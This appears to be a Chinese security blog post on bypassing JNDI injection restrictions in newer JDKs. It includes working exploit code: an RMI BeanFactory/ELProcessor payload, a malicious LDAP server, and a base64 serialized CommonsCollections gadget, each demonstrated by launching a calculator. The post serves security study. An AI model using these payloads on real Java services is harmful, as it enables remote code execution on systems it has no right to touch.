@@ -1,0 +1,439 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JNDI注入之高版本jdk绕过 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="JNDI注入之高版本jdk绕过 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="JNDI注入的局限性
+Java JNDI注入有很多种不同的利用方法，但是这些利用方式都在jdk的版本上存在一些限制。
+
+RMI Remote Object(直接绑定远程对象，如果本地不存在此对象，就通过codebase远程加载该对象的字节码..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JNDI注入之高版本jdk绕过
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-20
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="jndi注入的局限性">JNDI注入的局限性</h1>
+<p>Java JNDI注入有很多种不同的利用方法，但是这些利用方式都在jdk的版本上存在一些限制。</p>
+<ol>
+<li>RMI Remote Object(直接绑定远程对象，如果本地不存在此对象，就通过codebase远程加载该对象的字节码)
+<ul>
+<li>允许访问远程Codebase</li>
+<li>属性 java.rmi.server.useCodebaseOnly 的值必需为false</li>
+<li>从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true</li>
+</ul>
+</li>
+<li>RMI + JNDI Reference(客户端从Reference对象中获取codebase然后远程加载Factory工厂类，使用URLClassLoader进行加载)
+<ul>
+<li>JDK 6u141, JDK 7u131, JDK 8u121 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase </code>的默认值变为false，即默认不允许从远程的Codebase加载Factory工厂类</li>
+</ul>
+</li>
+<li>LDAP + JNDI Reference(通过LDAP协议返回JNDI Reference，和RMI+JDNI Reference的利用方式一致)
+<ul>
+<li>Oracle JDK 11.0.1、8u191、7u201、6u211之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性的默认值被调整为false</li>
+</ul>
+</li>
+</ol>
+<h1 id="高版本jdk绕过">高版本jdk绕过</h1>
+<h2 id="绕过思路整理">绕过思路整理</h2>
+<p>Oracle JDK 11.0.1、8u191、7u201、6u211之后，所有的JNDI注入已经失效。但是，依然可以通过绕过来完成利用。</p>
+<ol>
+<li>不通过远程加载Factory类，而是加载本地的Factory类进行利用</li>
+<li>通过LDAP直接返回一个恶意的序列化对象，JNDI依然会进行反序列化，然后利用Gadget进行利用</li>
+</ol>
+<h2 id="本地加载factory类绕过">本地加载Factory类绕过</h2>
+<h3 id="了解前提">了解前提</h3>
+<p>在RegistryContext.decodeObject()方法中会从Reference类中使用getFactoryClassLocation()方法获取其factoryLocation地址。可以看到这里出现了trustURLCodebase的身影，因为是高版本的jdk，所以其默认值为false，也就是说只要获取到了factoryLocation的值的话就会抛出异常，从到导致无法进入<code>NamingManager.getObjectInstance()</code>方法，那么也就没有本地加载Factory类一说了。<br>
+<img src="https://1jzz.github.io/post-images/1650452594810.png" alt="" loading="lazy"><br>
+<code>NamingManager.getObjectFactoryFromReference()</code>方法中在本地加载该类，如果加载失败的话就使用codebase进行远程加载(URLClassLoader)。<br>
+<img src="https://1jzz.github.io/post-images/1650452601017.png" alt="" loading="lazy"></p>
+<h3 id="绕过解析">绕过解析</h3>
+<p>现在虽然不能从远程加载恶意的Factory类，但是我们依然可以在返回的Reference中指定Factory类，这个Factory类必须要在JNDI Client本地的CLASSPATH中。必须实现<code>javax.naming.spi.ObjectFactory</code>接口，并且存在getObjectInstance()方法(在<code>NamingManager.getObjectInstance()</code>中调用了Factory的getObjectInstance()方法)。<br>
+入口类：<code>org.apache.naming.factory.BeanFactory</code></p>
+<ul>
+<li>实现了ObjectFactory接口</li>
+<li>实现了getObjectInstance()方法</li>
+</ul>
+<p><code>BeanFactory#getObjectInstance()</code>方法分析：<br>
+参数列表：<code>(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</code>。<br>
+执行命令逻辑：</p>
+<ol>
+<li>如果obj为ResourceRef类或者其子类的实例，就将其强转为Reference类</li>
+<li>然后调用其getClassName()方法获取ClassName，然后加载该类并获取其构造函数进行实例化(使用<code>beanClass.getConstructor().newInstance()</code>，要求该类的构造函数需要为共有且存在无参构造函数)。</li>
+<li>并且可以从key为forceString的RefAddr类或者子类的实例获取参数名(param)和其参数值（setterName)</li>
+<li>并从实例化的ClassName类获取名为参数值(setterName)的方法，并且参数列表为String.class。然后将参数名(param)和获取到的Method对象存放到HashMap中</li>
+<li>然后调用<code>Reference#getAll()</code>方法获取所有的RefAddr类或子类的实例，然后调用其getType()方法返回addrType字段(可以自己进行add设置)，如果获取到的addrType字段的值可以在上一步的HashMap找到的话就会返回Method对象并且将实例化的ClassName类和Object数组传入(参数)</li>
+<li>至此<code>BeanFactory#getObjectInstance()</code>方法执行方法的过程就分析完了</li>
+</ol>
+<p>思路整理：<br>
+其中主要需要变量obj对象为ResourceRef类实例，<code>ref.get(&quot;forceString&quot;)</code>这行代码中获取到的内容和存入HashMap的Method有关(执行什么方法，下一个add方法中需要设置什么addrType值)，之后会通过<code>Reference#getAll()</code>方法进行遍历，如果传入的addrType在HashMap中有相关的Method对象就会执行该方法。<br>
+其中执行的实例需要<code>Reference#className</code>指定，执行该实例的那个方法需要第一个RefAddr的Content中的参数值来指定，第二个RefAddr的值为第一个RefAddr的参数名。<br>
+虽然Runtime类的exec满足执行方法的条件，但是无法实例化。<br>
+这里的入口类为：<code>javax.el.ELProcessor</code>，该类具有公有无参函数，并且该类的eval方法只有一个String类型的参数且可以执行命令。</p>
+<h3 id="payload">payload</h3>
+<p>环境：</p>
+<ul>
+<li>SpringBoot2.6.1</li>
+<li>jdk8u241</li>
+</ul>
+<p>利用EL表达式执行任意命令：</p>
+<pre><code class="language-json">Registry registry = LocateRegistry.createRegistry(1099);
+ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, false, &quot;org.apache.naming.factory.BeanFactory&quot;, null);
+ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;1jzz=eval&quot;));
+ref.add(new StringRefAddr(&quot;1jzz&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance()&quot; +
+        &quot;.getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\&quot;)&quot;));
+ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
+registry.bind(&quot;Test&quot;, referenceWrapper);
+</code></pre>
+<p><code>ELProcessor#eval()</code>方法最后执行的代码：<br>
+<code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()&quot;)</code><br>
+执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1650452612790.png" alt="" loading="lazy"></p>
+<h2 id="jndi注入之ldap">JNDI注入之LDAP</h2>
+<h3 id="什么是ldap">什么是LDAP</h3>
+<p>LDAP是轻量目录访问协议(LightweightDirectory Access Protocol)的缩写，提供访问目录数据库方法的服务和协议，常用于与目录数据库组成目录服务。其中目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式：</p>
+<ul>
+<li>Java序列化</li>
+<li>JNDI Reference</li>
+<li>Marshalled对象</li>
+<li>Remote Location (已弃用)</li>
+</ul>
+<p>LDAP可以为存储的Java对象指定多种属性：</p>
+<ul>
+<li>javaCodeBase</li>
+<li>objectClass</li>
+<li>javaFactory</li>
+<li>javaSerializedData</li>
+<li>…</li>
+</ul>
+<h3 id="jndi注入之ldap-2">JNDI注入之LDAP</h3>
+<p>LDAP Server：</p>
+<pre><code class="language-json">private static final String LDAP_BASE = &quot;dc=test,dc=com&quot;;
+
+public static void LDAPServer() throws Exception{
+    InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+    config.setListenerConfigs(new InMemoryListenerConfig(
+            &quot;listen&quot;,
+            InetAddress.getByName(&quot;0.0.0.0&quot;),
+            1389,
+            ServerSocketFactory.getDefault(),
+            SocketFactory.getDefault(),
+            (SSLSocketFactory) SSLSocketFactory.getDefault()
+
+    ));
+    config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(&quot;http://127.0.0.1:8080/#Calc&quot;)));
+    InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+    System.out.println(&quot;Listening on 0.0.0.0:1389&quot;);
+    ds.startListening();
+}
+
+public static class OperationInterceptor extends InMemoryOperationInterceptor {
+    private URL codeBase;
+
+    public OperationInterceptor(URL codeBase) throws Exception {
+        this.codeBase = codeBase;
+    }
+
+    @Override
+    public void processSearchResult(InMemoryInterceptedSearchResult result) {
+        String base = result.getRequest().getBaseDN();
+        Entry e = new Entry(base);
+        try {
+            sendResult(result, base, e);
+        } catch (Exception e1) {
+            e1.printStackTrace();
+        }
+
+    }
+
+    public void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
+        String cbstring = this.codeBase.toString();
+        String javaFactory = base.substring(1);
+        int refPos = cbstring.indexOf('#');
+        if (refPos &gt; 0) {
+            cbstring = cbstring.substring(0, refPos);
+        }
+
+        URL url = new URL(cbstring + javaFactory.concat(&quot;.class&quot;));
+        System.out.println(&quot;send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + url);
+        e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+        e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+        e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);
+        e.addAttribute(&quot;javaFactory&quot;, javaFactory);
+
+/*            try {
+            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;&quot;));
+        } catch (ParseException parseException) {
+            parseException.printStackTrace();
+        }*/
+        result.sendSearchEntry(e);
+        result.setResult(new LDAPResult(0,ResultCode.SUCCESS));
+    }
+}
+
+public static void main(String[] args) throws Exception {
+    LDAPServer();
+
+}
+</code></pre>
+<p>JNDI Client：</p>
+<pre><code class="language-json">Context context = new InitialContext();
+context.lookup(&quot;ldap://127.0.0.1:1389/#Calc&quot;);
+</code></pre>
+<h3 id="ldap调用顺序">LDAP调用顺序</h3>
+<ol>
+<li><code>InitialContext.lookup()</code>：根据scheme获取对应的URLContent，并且调用其lookup()方法</li>
+<li><code>ldapURLContext.lookup()</code>：判断传入的的地址中是否存在问号，存在则抛出异常，不存在则调用父类的lookup方法</li>
+<li><code>GenericURLContext.lookup()</code>：调用了<code>ldapURLContext.getRootURLContext()</code>方法对LDAP URL进行解析(hostname、port、DN(#Calc))</li>
+<li><code>PartialCompositeContext.lookup()</code>：	找到了LdapCtx类的父类中的lookup方法对CompositeName为<code>#Calc</code>的DN</li>
+<li><code>LdapClient.search()</code>：编码请求内容并对Reply进行解码。调用链：</li>
+</ol>
+<p><img src="https://1jzz.github.io/post-images/1650452622255.png" alt="" loading="lazy"><br>
+获取到的attributes：<br>
+<img src="https://1jzz.github.io/post-images/1650452626947.png" alt="" loading="lazy"></p>
+<ol>
+<li><code>LdapCtx.c_lookup()</code>：这里已经是获取到了LDAP服务返回的内容，对entries中的attributes进行获取分析，如果存在key为javaClassName的值的话就会调用Obj.decodeObject()方法</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://1jzz.github.io/post-images/1650452634754.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li><code>Obj.decodeObject()</code>：先获取了CodeBase，然后又对attributes进行分析，是否存在key为javaSerializedData的值，如果存在就会调用deserializeObject()方法进行反序列化。如果存在key为javaRemoteLocation的值，就会调用decodeRmiObject()方法。否则则默认获取key为objectClass的值，如果objectClass的值中包含<code>javaNamingReference</code>或者<code>javanamingreference</code>则执行Obj.decodeReference()方法</li>
+<li><code>Obj.decodeReference()</code>：获取了objectClass的值之后获取javaFactory的值。接下来会new一个Reference对象，javaClassName(foo)会作为className，Calc会作为factory，之前解析的codebase会作为factoryLocation(http://127.0.0.1:8080/)</li>
+<li><code>DirectoryManager.getObjectInstance()</code>：从本地或者CodeBase加载LDAP中指定的类，如果返回了该类的实例就调用该类的getObjectInstance方法</li>
+<li><code>NamingManager.getObjectFactoryFromReference()</code>：先本地loadClass类名为factoryName的类，如果不存在则使用URLClassLoader进行远程加载，最后return一个该类的实例对象</li>
+</ol>
+<p>fastjson利用，执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1650452640718.png" alt="" loading="lazy"></p>
+<h2 id="ldap返回序列化gadget执行命令">LDAP返回序列化Gadget执行命令</h2>
+<p>看了上面的LDAP的调用顺序后，我们发现Reference类是客户端new的，而不是我们的LDAP Server可以控制的，所以就无法构造ResourceRef类，也就无法通过加载本地Factory类进行绕过。但是在调用过程中如果存在key为javaSerializedData的值则进行反序列化操作，那么我们可以构造一个Gadget然后直接利用Gadget来进行利用。<br>
+环境：JDK8u241</p>
+<pre><code class="language-json">public void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, IOException, ParseException {
+    String cbstring = this.codeBase.toString();
+    int refPos = cbstring.indexOf('#');
+    if (refPos &gt; 0) {
+        cbstring = cbstring.substring(0, refPos);
+    }
+
+    e.addAttribute(&quot;javaClassName&quot;, &quot;Calc&quot;);
+    e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAEdGVzdHNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABsAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VxAH4AGAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAAFdGVzdDF4&quot;));
+
+
+    result.sendSearchEntry(e);
+    result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+}
+</code></pre>
+<p>JNDI lookup</p>
+<pre><code class="language-json">Context context = new InitialContext();
+context.lookup(&quot;ldap://127.0.0.1:1389/#Calc&quot;);
+</code></pre>
+<p>执行结果：<br>
+<img src="https://1jzz.github.io/post-images/1650452648097.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>本文分别说明了JNDI注入的两种绕过方法：</p>
+<ul>
+<li>本地加载Factory类绕过</li>
+<li>LDAP返回序列化Gadget执行命令</li>
+</ul>
+<p>这两个绕过方法也各有限制。<br>
+本地加载Factory类绕过：</p>
+<ul>
+<li>存在tomcat-embed-core依赖</li>
+<li>存在tomcat-embed-el依赖</li>
+</ul>
+<p>LDAP返回序列化Gadget执行命令：</p>
+<ul>
+<li>存在CC链或者CB链依赖包</li>
+</ul>
+<h1 id="参考">参考</h1>
+<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>
+<a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/">http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#jndi%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7">JNDI注入的局限性</a></li>
+<li><a href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87">高版本jdk绕过</a>
+<ul>
+<li><a href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86">绕过思路整理</a></li>
+<li><a href="#%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BDfactory%E7%B1%BB%E7%BB%95%E8%BF%87">本地加载Factory类绕过</a>
+<ul>
+<li><a href="#%E4%BA%86%E8%A7%A3%E5%89%8D%E6%8F%90">了解前提</a></li>
+<li><a href="#%E7%BB%95%E8%BF%87%E8%A7%A3%E6%9E%90">绕过解析</a></li>
+<li><a href="#payload">payload</a></li>
+</ul>
+</li>
+<li><a href="#jndi%E6%B3%A8%E5%85%A5%E4%B9%8Bldap">JNDI注入之LDAP</a>
+<ul>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFldap">什么是LDAP</a></li>
+<li><a href="#jndi%E6%B3%A8%E5%85%A5%E4%B9%8Bldap-2">JNDI注入之LDAP</a></li>
+<li><a href="#ldap%E8%B0%83%E7%94%A8%E9%A1%BA%E5%BA%8F">LDAP调用顺序</a></li>
+</ul>
+</li>
+<li><a href="#ldap%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96gadget%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">LDAP返回序列化Gadget执行命令</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/XUFSmbGFY/">
+              <h3 class="post-title">
+                了解JNDI注入
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
